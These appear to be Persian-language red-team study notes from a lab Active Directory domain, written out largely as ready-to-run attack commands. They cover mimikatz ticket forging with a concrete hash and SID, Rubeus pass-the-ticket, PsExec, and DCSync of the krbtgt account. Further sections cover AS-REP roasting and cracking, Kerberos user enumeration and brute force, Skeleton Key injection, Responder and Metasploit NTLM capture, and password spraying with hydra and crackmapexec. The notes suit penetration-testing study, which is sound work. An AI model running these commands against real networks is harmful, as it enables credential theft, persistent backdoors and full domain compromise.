kerberos::golden /admin:fateme /domain:RED.TEAM /id:500 /sid:S-1-5-21-1807605247-2408605128-2947868414 /target:DC.RED.TEAM /rc4:d3b48a0ef60cbfb15408db43d32fa96f /service:LDAP /ticket:silver.kirbi
.\Rubeus.exe ptt /ticket:silver.kirbi
.\PsExec.exe -accepteula \\DC\c$ cmd
```

```
mimikatz # lsadump::dcsync /dc:DC.RED.TEAM /domain:RED.TEAM /user:krbtgt
```


1. **lsadump::dcsync**:
    
    - این بخش دستور به **Mimikatz** می‌گوید که از طریق **DCSync** عملیات را انجام دهد. **DCSync** یک تکنیک است که به شما اجازه می‌دهد تا اطلاعات مربوط به حساب‌های کاربری (مانند هش‌های گذرواژه) را از کنترل‌کننده دامنه (Domain Controller) همگام‌سازی کنید، دقیقاً مشابه کاری که یک **Domain Controller** برای همگام‌سازی اطلاعات با سایر دامنه‌ها انجام می‌دهد.
    - این دستور به طور خاص به سیستم حمله‌کننده اجازه می‌دهد تا اطلاعات حساس را بدون اینکه نیاز به حمله به سیستم عامل یا ورود به سیستم باشد، از کنترل‌کننده دامنه استخراج کند.
2. **/dc:DC.RED.TEAM**:
    
    - **/dc** به شما این امکان را می‌دهد که **نام یا آدرس IP** **Domain Controller** را مشخص کنید که می‌خواهید اطلاعات از آن استخراج شود.
    - در این مثال، **DC.RED.TEAM** اشاره به کنترل‌کننده دامنه‌ای دارد که حمله به آن هدف قرار گرفته است. در عمل، ممکن است به جای **DC.RED.TEAM** از آدرس IP یا نام کامل دامنه استفاده کنید.
3. **/domain:RED.TEAM**:
    
    - این پارامتر به **Mimikatz** می‌گوید که کدام دامنه باید برای استخراج اطلاعات استفاده شود. در این مثال، دامنه هدف **RED.TEAM** است.
4. **/user:krbtgt**:
    
    - **/user**
       نام کاربری است که قصد استخراج اطلاعات آن را دارید. در اینجا، **krbtgt** است که یکی از حساب‌های پیش‌فرض در **Active Directory** است.
    - **krbtgt** 
      حسابی است که برای مدیریت **Kerberos TGT (Ticket Granting Ticket)** ها استفاده می‌شود و دسترسی به آن معمولاً می‌تواند به مهاجم اجازه دهد تا اعتبارسنجی Kerberos را جعل کند و حملات پیچیده‌تری انجام دهد.
    - با استفاده از **DCSync**، می‌توانید هش گذرواژه این کاربر را به دست آورید.


این دستور به شما اجازه می‌دهد که **هش‌های گذرواژه** (مانند NTLM یا Kerberos) را از یک **Domain Controller** به طور مستقیم استخراج کنید.

![[Pasted image 20241203185131.png]]

- **SAM ACCOUNT**:
    
    - اطلاعات مربوط به حساب کاربری **krbtgt** در **SAM** (Security Account Manager) سیستم.
    - **SAM Username**:
       نام کاربری که در اینجا **krbtgt** است.
    - **Account Type**:
       نوع حساب کاربری.
    - **User Account Control**:
       شامل وضعیت‌های مختلف حساب مانند فعال یا غیرفعال بودن حساب
    - **Account expiration**: 
      تاریخ انقضای حساب (در اینجا خالی است).
    - **Password last change**:
       آخرین باری که گذرواژه تغییر کرده (در اینجا به تاریخ 12/2/2024).
    - **Object Security ID**:
       شناسه امنیتی شیء این کاربر در دامین.
- **Credentials**:
    
    - **NTLM Hash**: هش NTLM مربوط به گذرواژه حساب.
    - **LM Hash**: هش LM که در حال حاضر به طور گسترده‌ای استفاده نمی‌شود، اما هنوز در برخی سیستم‌ها باقی مانده است.
- **Supplemental Credentials**:
    
    - شامل داده‌های بیشتر مانند **Kerberos** و **NTLM** که به سیستم‌های مختلف در Active Directory برای احراز هویت استفاده می‌شوند.
        
    - **Primary: NTLM-Strong-NTOWF**: این اطلاعات مربوط به **NTLM** است.
        
    - **Primary: Kerberos-Newer-Keys**: داده‌های مربوط به کلیدهای جدید Kerberos برای این حساب.
        
        - شامل هش‌ها برای **AES256**, **AES128**, و **DES**.
    - **Primary: Kerberos**: شامل هش‌های مربوط به **Kerberos**.
        
- **WDigest**:
    
    - **WDigest** یک پروتکل قدیمی برای ذخیره‌سازی و ارسال گذرواژه‌ها در Windows است. این بخش هش‌های **WDigest** را برای این حساب نشان می‌دهد. این هش‌ها می‌توانند برای حملات مختلف مورد استفاده قرار گیرند.
### HOST + WMIC : 

```
kerberos::golden /admin:fateme /domain:RED.TEAM /id:500 /sid:S-1-5-21-1807605247-2408605128-2947868414 /target:DC.RED.TEAM /rc4:d3b48a0ef60cbfb15408db43d32fa96f /service:rpcss /ptt or /ticket:silver.kirbi
dir \\DC\c$\

or 


kerberos::golden /admin:fateme /domain:RED.TEAM /id:500 /sid:S-1-5-21-1807605247-2408605128-2947868414 /target:DC.RED.TEAM /rc4:d3b48a0ef60cbfb15408db43d32fa96f /service:rpcss /ticket:silver.kirbi
.\Rubeus.exe ptt /ticket:silver.kirbi
.\PsExec.exe -accepteula \\DC\c$ cmd
```

```
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"
#You can also use wmic
wmic remote.computer.local list full /format:list
```



----

# AS-REP Roasting


### حمله **AS-REP Roasting** چیست؟

**AS-REP Roasting** 
یکی از حملات محبوب در زمینه **Kerberos** است که به خصوص در **Active Directory** (AD) به‌کار می‌رود. این حمله برای بدست آوردن رمز عبور کاربران در سیستم‌های **Windows** و **Active Directory** طراحی شده است.

### نحوه عملکرد حمله AS-REP Roasting:

در پروتکل **Kerberos**، کاربران به **Authentication Service (AS)** درخواست ارسال می‌کنند تا احراز هویت شوند و سپس یک **TGT (Ticket Granting Ticket)** دریافت کنند که برای دسترسی به سایر خدمات شبکه‌ای استفاده می‌شود.

در صورتی که **Pre-Authentication** برای یک کاربر غیرفعال باشد، **AS** بدون نیاز به بررسی رمز عبور یک **AS-REP** (Authentication Service Response) به درخواست پاسخ می‌دهد. این پاسخ شامل بلیط Kerberos رمزگذاری شده است که می‌توان آن را بدون رمز عبور صحیح دریافت کرد.

در حمله **AS-REP Roasting**، مهاجم به این ویژگی سوءاستفاده می‌کند. مهاجم سعی می‌کند برای کاربران مختلفی که **Pre-Authentication Disabled** دارند، **AS-REP**های معتبر درخواست کرده و سپس تلاش می‌کند تا رمز عبور این کاربران را با استفاده از حملات **brute force** یا **dictionary attack** حدس بزند.

### جزئیات نحوه حمله:

1. **پیدا کردن کاربران با Pre-Authentication Disabled**: مهاجم ابتدا تلاش می‌کند تا کاربران با ویژگی **Pre-Authentication Disabled** را شناسایی کند. این ویژگی به معنای غیرفعال بودن چالش احراز هویت اولیه برای یک حساب کاربری است، که باعث می‌شود **AS-REP** بدون نیاز به رمز عبور قابل دریافت باشد.
    
2. **ارسال درخواست‌های AS-REP**: هنگامی که کاربری با این ویژگی شناسایی شد، مهاجم درخواست‌های AS-REP را برای آن کاربران ارسال می‌کند. این درخواست‌ها بلیط‌های Kerberos رمزگذاری شده‌ای را باز می‌گردانند که به هیچ وجه نیاز به رمز عبور ندارند.
    
3. **حدس رمز عبور**: مهاجم سپس می‌تواند **AS-REP**ها را که دریافت کرده است، با استفاده از **brute force** یا **dictionary attack** برای پیدا کردن رمز عبور صحیح بررسی کند. این فرآیند معمولاً با ابزارهایی مانند **John the Ripper** یا **Hashcat** انجام می‌شود.
    

### نحوه اجرای حمله AS-REP Roasting:

برای اجرای حمله **AS-REP Roasting**، ابزارهای مختلفی وجود دارند که می‌توانند از **AS-REP**هایی که دریافت می‌شود، برای انجام حملات **brute-force** استفاده کنند.

یک ابزار معروف برای این نوع حمله، **Impacket** است که مجموعه‌ای از ابزارها برای حملات مختلف در شبکه‌های **Windows** فراهم می‌کند. ابزار **GetNPUsers.py** در این مجموعه برای انجام حمله **AS-REP Roasting** استفاده می‌شود.


برای شناسایی User های که do not preauthrequire با استفاده از ابزار powerview میتونیم اینکارو انجام بدیم 

![[Pasted image 20260120204410.png]]

```powershell
Get-Domainuser -PreauthNotRequired
```


![[Pasted image 20260120204601.png]]

# Rubeus

```
.\rubeus asreproast 
.\rubeus /format:john /outfule:hash.txt
```

![[Pasted image 20260120204617.png]]

# ASREPRoast.ps1

```
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
import-module ASREPRoast.ps1
invoke-ASREPRoast
```

![[Pasted image 20241230103825.png]]

```
invoke-ASREPRoast | select -Expandproperty hash
```

![[Pasted image 20260120073319.png]]

```
/usr/share/doc/python3-impacket/examples/GetNPUsers.py -usersfile users.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip 192.168.141.138 $KeyDistributionCenter 'RED.TEAM/'
```

![[Pasted image 20260120073356.png]]

```
john --wordlist=/home/kali/.cache/vmware/drag_and_drop/Tk0fDi/rockyou2024.txt ASREProastables.txt
```

----

# KERBEROS Brute Forcing

حمله **Brute Force** به **Kerberos** یکی از روش‌های تهدیدی است که مهاجمان از آن برای نفوذ به سیستم‌های شبکه‌ای استفاده می‌کنند. در این حمله، مهاجم تلاش می‌کند تا با امتحان کردن تمام ترکیبات ممکن از کلمات عبور یا کلیدهای رمزنگاری، به اطلاعات مورد نظر دست پیدا کند. در اینجا توضیحاتی در مورد نحوه عملکرد پروتکل **Kerberos**، روش‌های انجام حملات Brute Force و پیشگیری از آن آورده شده است.


### **عملکرد پروتکل Kerberos:**

1. **Authenicator (درخواست بلیت اولیه)**:
    زمانی که یک کاربر وارد سیستم می‌شود، برای دریافت بلیت از **KDC** درخواست می‌کند.
2. **Bilateral Ticket (بلیت دسترسی)**:
    پس از تایید هویت، **KDC** یک بلیت به کاربر صادر می‌کند که برای دسترسی به سرویس‌های مختلف در شبکه استفاده می‌شود.
3. **Requesting Service**: پس از دریافت بلیت، کاربر می‌تواند از سرویس‌های مختلف درخواست کند و برای هر سرویس، بلیت جدیدی دریافت می‌کند.

### **حمله Brute Force به Kerberos:**

حمله Brute Force در Kerberos به‌ویژه به کلمه عبور یا کلیدهای رمزنگاری مرتبط با **TGT (Ticket Granting Ticket)** اشاره دارد. مهاجم با استفاده از ابزارهای خاص تلاش می‌کند تا تمام ترکیبات ممکن از کلمات عبور را امتحان کرده و به سیستم نفوذ کند.

#### **1. Brute Forcing Kerberos Tickets (TGT):**

در این حمله، مهاجم از ابزارهایی مانند **Kerberos Brute Forcing Tools** (مثلاً `krb5-bruteforce` یا `Medusa`) استفاده می‌کند تا بلیت **TGT** را حدس بزند. در این فرآیند، مهاجم تمام ترکیبات رمزهای عبور را ارسال می‌کند تا ببیند آیا می‌تواند **TGT** صحیح را دریافت کند.

#### **2. Pass-the-Ticket Attack:**

در این نوع حمله، مهاجم از بلیت‌های معتبر استفاده می‌کند تا به سرویس‌های مختلف در شبکه دسترسی پیدا کند. این حمله می‌تواند همراه با حملات brute force به بلیت‌ها انجام شود.

### **ابزارهای مورد استفاده برای حمله Brute Force به Kerberos:**

- **Hydra**: ابزاری برای انجام حملات brute force که در پروتکل Kerberos استفاده می‌شود.
- **Medusa**: ابزار مشابه Hydra برای انجام brute force attacks.
- **Kerbrute**: ابزاری برای brute forcing **TGT** و **AS-REP** در پروتکل Kerberos.
- **Impacket** و **John the Ripper**: ابزارهایی برای تجزیه و تحلیل و حمله به رمزهای عبور و بلیت‌های Kerberos.

### **چالش‌های حمله Brute Force به Kerberos:**

1. **محدودیت تلاش‌ها**: معمولاً پروتکل Kerberos محدودیت‌هایی برای تعداد درخواست‌ها دارد. بعد از چند تلاش ناموفق، حساب کاربری قفل می‌شود.
2. **رمزنگاری قوی**: اگر از رمزهای عبور پیچیده و رمزنگاری قوی استفاده شود، این حملات زمان زیادی می‌برد.
3. **محافظت از بلیت‌ها**: بلیت‌ها معمولاً برای مدت محدودی معتبر هستند و پس از مدتی منقضی می‌شوند.

## Metasploit

```
msf6 auxiliary(gather/kerberos_enumusers) > set rhosts 192.168.141.138
rhosts => 192.168.141.138  
msf6 auxiliary(gather/kerberos_enumusers) > set user_file users.txt
user_file => users.txt
msf6 auxiliary(gather/kerberos_enumusers) > set domain red.team
domain => red.team
msf6 auxiliary(gather/kerberos_enumusers) > exploit
```


![[Pasted image 20260120205205.png]]



## NMAP 

```
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm="red.team",userdb="users.txt" 192.168.141.138
```

![[Pasted image 20260120205430.png]]


## Kerbute

```
git clone https://github.com/TarlogicSecurity/kerbrute
cd kerbrute
pip install -r requirements.txt
```

```
python kerbrute.py -dc-ip 192.168.141.138 -domain red.team -users ../users.txt -passwords /home/kali/Downloads/pass1.txt
```

![[Pasted image 20260120074001.png]]


----

# Skeleton Key

**حمله Skeleton Key** یک نوع حمله امنیتی است که در آن مهاجم از یک نرم‌افزار مخرب استفاده می‌کند تا به صورت پنهانی به حساب‌های مدیریتی سیستم‌های ویندوز دسترسی پیدا کند و به آن‌ها اجازه می‌دهد بدون تغییر رمز عبور کاربران، به سیستم وارد شوند. این حمله معمولاً در محیط‌های **Active Directory (AD)** مورد استفاده قرار می‌گیرد و می‌تواند تأثیرات جدی بر امنیت شبکه‌های سازمانی داشته باشد.

### **چگونه حمله Skeleton Key کار می‌کند؟**

حمله Skeleton Key به‌طور خاص بر روی سرویس **Domain Controller** (DC) سیستم‌های **Active Directory** تأثیر می‌گذارد. در این حمله، مهاجم یک نرم‌افزار مخرب به نام **Skeleton Key** را بر روی **Domain Controller** نصب می‌کند. این ابزار به مهاجم این امکان را می‌دهد که یک رمز عبور "پشتیبان" به سیستم‌ها اضافه کند، به طوری که تمامی کاربران شبکه همچنان می‌توانند از رمزهای عبور معمولی خود استفاده کنند، اما مهاجم می‌تواند از رمز عبور مخفی خود برای دسترسی به تمامی حساب‌های کاربری استفاده کند.

این "Skeleton Key" یک رمز عبور پشتیبانی است که فقط در سطح **Domain Controller** کار می‌کند و به مهاجم اجازه می‌دهد که به تمام حساب‌های کاربری موجود در **Active Directory** دسترسی داشته باشد.

### **ویژگی‌های حمله Skeleton Key:**

1. **دسترسی به حساب‌های مدیریتی**: حمله Skeleton Key به مهاجم این امکان را می‌دهد که به تمامی حساب‌های کاربری در **Active Directory** دسترسی پیدا کند، حتی بدون دانستن رمز عبور اصلی آن‌ها.
    
2. **تغییرات مخفیانه**: برخلاف روش‌های معمول حملات که ممکن است موجب قفل شدن حساب‌ها یا تغییرات قابل مشاهده شوند، در حمله Skeleton Key، هیچ‌گونه تغییری در رمز عبور اصلی حساب‌ها مشاهده نمی‌شود و همه چیز به صورت پنهانی انجام می‌شود.
    
3. **دسترسی به شبکه داخلی**: از آنجا که این حمله فقط بر روی **Domain Controller** انجام می‌شود، مهاجم می‌تواند به تمامی سیستم‌های موجود در شبکه دسترسی داشته باشد که به **Active Directory** متصل هستند.
    
4. **حمله با نصب نرم‌افزار مخرب**: این حمله معمولاً با استفاده از یک نرم‌افزار مخرب که به‌طور خاص برای نفوذ به سیستم‌های **Windows** طراحی شده، انجام می‌شود. این نرم‌افزار به صورت مخفیانه در **Domain Controller** اجرا می‌شود.
    

### **فرآیند حمله Skeleton Key:**

1. **نفوذ به شبکه**: مهاجم ابتدا به شبکه داخلی دسترسی پیدا می‌کند. این ممکن است از طریق یک آسیب‌پذیری در سیستم یا استفاده از تکنیک‌های مهندسی اجتماعی (Social Engineering) برای دستیابی به سیستم‌های مدیریتی باشد.
    
2. **نصب نرم‌افزار Skeleton Key**: پس از دستیابی به **Domain Controller**، مهاجم نرم‌افزار **Skeleton Key** را نصب می‌کند. این نرم‌افزار به صورت مخفیانه و بدون اطلاع مدیران شبکه در سیستم اجرا می‌شود.
    
3. **ایجاد رمز عبور پشتیبان**: **Skeleton Key** یک رمز عبور عمومی را به همه حساب‌های کاربری موجود در **Active Directory** اضافه می‌کند. این رمز عبور به مهاجم این امکان را می‌دهد که به تمامی سیستم‌ها و حساب‌ها بدون تغییر در رمزهای عبور اصلی دسترسی داشته باشد.
    
4. **دسترسی به تمامی حساب‌های کاربری**: حالا مهاجم می‌تواند از این رمز عبور برای دسترسی به تمامی سیستم‌ها و حساب‌های کاربری استفاده کند و تمامی اطلاعات موجود در شبکه را تحت کنترل خود درآورد.
    



# skeleton key

حمله **Skeleton Key** یکی از حملات پیشرفته و خطرناک به سیستم‌های دامین کنترلر ویندوز است که به هکرها اجازه می‌دهد یک پسورد یکسان (Skeleton Key) را برای تمامی حساب‌های کاربری موجود در یک دامین تنظیم کنند. این پسورد به طور مخفیانه در حافظه سیستم دامین کنترلر ذخیره می‌شود و به هکر این امکان را می‌دهد که به تمامی حساب‌ها در دامین دسترسی پیدا کند، حتی اگر رمز عبور اصلی آن‌ها تغییر کند. در این حمله، حتی اگر مدیران یا کاربران رمز عبور خود را تغییر دهند، حمله موفقیت‌آمیز باقی خواهد ماند.

### ویژگی‌های حمله Skeleton Key:

1. **تزریق پسورد عمومی در حافظه سیستم**: حمله Skeleton Key بر اساس دستکاری در حافظه دامین کنترلر استوار است. پسورد **Skeleton Key** به طور مستقیم در حافظه دامین کنترلر تزریق می‌شود. این بدین معناست که برای تمام حساب‌های موجود در دامنه، یک پسورد یکسان به نام Skeleton Key اضافه می‌شود که برای ورود به سیستم معتبر است.
    
2. **امنیت ضعیف در سطح شبکه**: حمله فقط در صورتی قابل انجام است که هکر دسترسی به سطح بالا مانند **Domain Admin** داشته باشد. پس از دسترسی به این سطح، هکر می‌تواند از **Mimikatz** برای تزریق پسورد استفاده کند.
    
3. **مخفی بودن حمله**: مهم‌ترین ویژگی حمله Skeleton Key این است که پسورد عمومی برای تمامی حساب‌ها به صورت مخفیانه اعمال می‌شود و هکر می‌تواند بدون تغییر دادن پسورد اصلی کاربران، به تمامی سیستم‌ها دسترسی پیدا کند. این حمله معمولاً توسط نرم‌افزارهای نظارتی یا سیستم‌های امنیتی شناسایی نمی‌شود، زیرا هیچ تغییر آشکاری در پسوردهای واقعی کاربران صورت نمی‌گیرد.
    
4. **دستگاه‌های تحت تاثیر**: پسورد Skeleton Key فقط در دامین کنترلرهای ویندوز عمل می‌کند. این حمله بر روی دستگاه‌های کاربری یا سایر سرورها اثر نمی‌گذارد، مگر اینکه به طور خاص از سیستم دامین کنترلر برای ورود به آنها استفاده شود.
    

### نحوه عملکرد حمله Skeleton Key:

1. **گرفتن دسترسی سطح بالا**: برای انجام حمله، هکر ابتدا نیاز دارد که دسترسی سطح بالا (مانند Domain Admin) را به دامین کنترلر به دست آورد.
    
2. **اجرای Mimikatz**: پس از داشتن دسترسی، هکر از ابزار **Mimikatz** برای تزریق پسورد Skeleton Key استفاده می‌کند. این ابزار به طور خاص برای استخراج داده‌های احراز هویت و انجام حملات به سیستم‌های ویندوز طراحی شده است.
    
3. **تزریق پسورد به حافظه سیستم**: پسورد Skeleton Key در حافظه دامین کنترلر ذخیره می‌شود. پس از این تزریق، تمام حساب‌های کاربری در دامنه می‌توانند با استفاده از این پسورد جدید وارد شوند، بدون اینکه نیازی به تغییر پسورد اصلی آن‌ها باشد.
    
4. **دسترسی به سیستم‌ها**: هکر اکنون می‌تواند به تمامی حساب‌ها در دامین دسترسی پیدا کند و به سیستم‌ها وارد شود، حتی اگر رمز عبور آن‌ها تغییر کرده باشد. این دسترسی می‌تواند برای نفوذ بیشتر در سیستم‌ها و گسترش حمله استفاده شود.
    


### سناریو:

### گام 1: دسترسی به دامین کنترلر

### گام 2: اجرای Mimikatz

دستور زیر را در Mimikatz وارد می‌کند تا بتواند پسورد **Skeleton Key** را به حافظه سیستم دامین کنترلر تزریق کند

### گام 3: تزریق Skeleton Key

```shell
mimikatz.exe
privilege::debug
misc::skeleton
```


![[Pasted image 20260120210024.png]]


پس از وارد کردن دستور، پسورد Skeleton Key به حافظه دامین کنترلر تزریق می‌شود. این پسورد برای تمامی حساب‌های کاربری در دامنه معتبر است و می‌تواند بدون تغییر پسورد اصلی کاربران استفاده شود.
اکنون رمز تمام کاربران mimikatz میباشد
حال برای وصل شدن به DC از دستور زیر با یوزر معمولی reza استفاده میکنیم 

```
net use R: \\DC.red.team\C$ /user:red.team\administrator mimikatz
```


---

## **1️⃣ LLMNR Poisoning**

### **LLMNR چیست؟**
- **Link-Local Multicast Name Resolution**  
- پروتکلی در ویندوز و برخی سیستم‌ها برای **حل نام‌ها (Name Resolution)** وقتی **DNS پاسخ نمی‌دهد**.  
- به سیستم اجازه می‌دهد **نام کامپیوترها در شبکه محلی** را پیدا کند.

### **حمله چگونه است؟**
1. کاربر سعی می‌کند به کامپیوتری وصل شود، اما DNS پاسخ نمی‌دهد.  
2. سیستم یک درخواست **LLMNR Multicast** در شبکه ارسال می‌کند: "چه کسی این نام را دارد؟".  
3. مهاجم با Responder به این درخواست پاسخ می‌دهد و خود را **صاحب آن نام معرفی می‌کند**.  
4. سیستم قربانی سعی می‌کند با مهاجم ارتباط برقرار کند و **Credential Hash ارسال می‌کند**.  

### **پیامد:**
- جمع‌آوری **NTLM hashes** کاربران برای حملات **Pass-the-Hash** یا **Cracking Password**.  

---

## **2️⃣ NBT-NS Poisoning**

### **NBT-NS چیست؟**
- **NetBIOS Name Service**  
- پروتکلی برای **حل نام‌ها در شبکه‌های قدیمی ویندوز** (LAN) بدون DNS.  
- مشابه LLMNR ولی **برای سیستم‌های قدیمی‌تر و NetBIOS استفاده می‌شود**.

### **حمله چگونه است؟**
- مهاجم **به درخواست NBT-NS پاسخ می‌دهد** و خود را به عنوان کامپیوتر مقصد معرفی می‌کند.  
- قربانی **Credential یا اطلاعات اتصال** را ارسال می‌کند.  

### **پیامد:**
- مشابه LLMNR: جمع‌آوری **Hashهای NTLM** یا **Credentialهای Plaintext** در برخی موارد.  

---

## **3️⃣ MDNS Poisoning**

### **MDNS چیست؟**
- **Multicast DNS**  
- پروتکلی برای **کشف دستگاه‌ها و سرویس‌ها در شبکه محلی** (Mac، Linux و بعضی ویندوزها).  
- به کاربران و سیستم‌ها اجازه می‌دهد بدون DNS مرکزی **نام سرویس‌ها را پیدا کنند**.

### **حمله چگونه است؟**
- مهاجم به درخواست MDNS پاسخ می‌دهد و خود را به عنوان سرویس مورد نظر معرفی می‌کند.  
- سیستم قربانی تلاش می‌کند به مهاجم وصل شود و **اطلاعات ورود یا سرویس** را ارسال می‌کند.  

### **پیامد:**
- جمع‌آوری اطلاعات، Credential یا **دستکاری مسیر اتصال سرویس‌ها**.  

---

## **4️⃣ نکات مهم**

- این حملات **فقط در شبکه داخلی یا محیط تست قانونی** باید اجرا شوند.  
- معمولاً **Responder** این حملات را به صورت خودکار انجام می‌دهد.  
- به مهاجم اجازه می‌دهد **credential hashهای کاربران شبکه داخلی را بدست آورد بدون اینکه کاربر متوجه شود**.  


## **1️⃣ رفتار سیستم هنگام لاگین:**

وقتی یک سیستم **می‌خواهد به شبکه یا سرویس دامنه لاگین کند**:

1. ابتدا بررسی می‌کند که **نام کاربری یا هاست مقصد را می‌شناسد یا نه**.
    
2. اگر سیستم **نمی‌تواند هاست مقصد را از طریق DNS پیدا کند**، از پروتکل‌های **LLMNR، NBT-NS یا mDNS** برای **حل اسم (Name Resolution)** استفاده می‌کند.
    
3. وقتی اسم به IP ترجمه شد، سیستم از پروتکل **NTLM یا Kerberos** برای **احراز هویت (Authentication)** استفاده می‌کند.

### **نحوه دخالت LLMNR / NBT-NS / mDNS:**

- **LLMNR (Link-Local Multicast Name Resolution):**
    
    - برای **حل اسم‌ها در شبکه محلی** وقتی DNS کار نمی‌کند.
        
    - سیستم یک **درخواست چندپخشی (multicast)** ارسال می‌کند تا IP مربوط به اسم را پیدا کند.
        
- **NBT-NS (NetBIOS Name Service):**
    
    - مشابه LLMNR اما مخصوص **NetBIOS / قدیمی ویندوز**.
        
    - سیستم نام‌ها را با استفاده از **شبکه محلی** پیدا می‌کند.
        
- **mDNS (Multicast DNS):**
    
    - در شبکه‌های محلی و **سیستم‌های غیرویندوزی یا ترکیبی** کاربرد دارد.
        
    - نام‌ها را به صورت **Multicast** حل می‌کند.
        

> نکته: این پروتکل‌ها فقط برای **Name Resolution** هستند، نه Authentication.


---

### **1️⃣ ابزار Responder چیست؟**

- **Responder**
- یک ابزار **شبکه داخلی (internal network)** برای جمع‌آوری اعتبارنامه‌ها و اجرای حملاتی مثل **LLMNR/NBT-NS/MDNS Poisoning** است.
    
- این ابزار به شما اجازه می‌دهد **ترافیک نام‌گذاری شبکه محلی** را به خودتان هدایت کرده و هش‌های رمز عبور یا اطلاعات ورود کاربران را بدست آورید.
    
- کاربرد اصلی: **شناسایی و جمع‌آوری اطلاعات کاربران در شبکه‌های ویندوزی**.


[[Responder - Inveigh]]


---


![[Pasted image 20250530165511.png]]


روش دوم استفاده از یک اگزلری هستش 

![[Pasted image 20260120224915.png]]

```bash
use auxiliary/server/capture/smb
```

![[Pasted image 20260120225146.png]]'
![[Pasted image 20260120225204.png]]


---

```shell
use auxiliary/server/capture/http_ntlm
```

![[Pasted image 20260120225927.png]]


----

یکی دیگر از روش های دسترسی گرفتن استفاده از روش password spraying هستش

![[Pasted image 20260120231231.png]]

یا استفاده از ابزار hydra هستش

```shell
hydra -L users.txt -p Aa123@ rdp:\\192.168.233.132
```


---

![[Pasted image 20260120231507.png]]

یکی دیگر از روش های password spraying استفاده از ابزار crackmapexec هستش 

```shell
crackmapexec smb 192.168.233.132 -u users.txt -p password.txt
```

نکته : فایل passwrod.txt فقط یه پسورد توشه 

---

روش دیگر استفاده از یکی از ماژول های متاسپلویت هستش

![[Pasted image 20260120231752.png]]

```shell
use auxiliary/scanner/smb/smb_login
```

